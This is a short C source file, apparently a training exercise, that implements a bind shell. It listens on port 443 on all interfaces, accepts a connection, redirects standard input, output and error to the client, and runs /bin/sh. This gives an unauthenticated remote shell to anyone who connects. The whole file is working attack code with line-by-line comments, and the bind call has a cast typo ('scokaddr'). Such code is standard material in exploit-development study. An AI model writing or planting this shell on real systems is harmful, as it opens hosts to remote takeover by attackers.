#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(){
	// variables declaration
	int svrfd, clientfd;
	struct sockaddr_in svrAddr, clientAddr;

	// bind shell details
	svrAddr.sin_family = AF_INET; // to use IPv4
	svrAddr.sin_port = htons(443);// to bind to port 443
	svrAddr.sin_addr.s_addr = htonl(INADDR_ANY);// to listen on ANY address i.e. 0.0.0.0

	// socket section
	svrfd = socket(AF_INET, SOCK_STREAM, 0); // to create a socket
	bind(svrfd, (struct scokaddr*)&svrAddr, sizeof(svrAddr)); // to bind the socket created to 0.0.0.0:443
	listen(svrfd, 0); // to wait for any incoming connection

	// client connected
	int sockLen = sizeof(clientAddr);
	clientfd = accept(svrfd, (struct sockaddr*)&clientAddr, &sockLen);

	// to redirect stdin, stdout, stderr
	dup2(clientfd, 0);
	dup2(clientfd, 1);
	dup2(clientfd, 2);

	// to give a shell to the connected client
	execve("/bin/sh", NULL, NULL);
	close(clientfd);

	return 0;

}
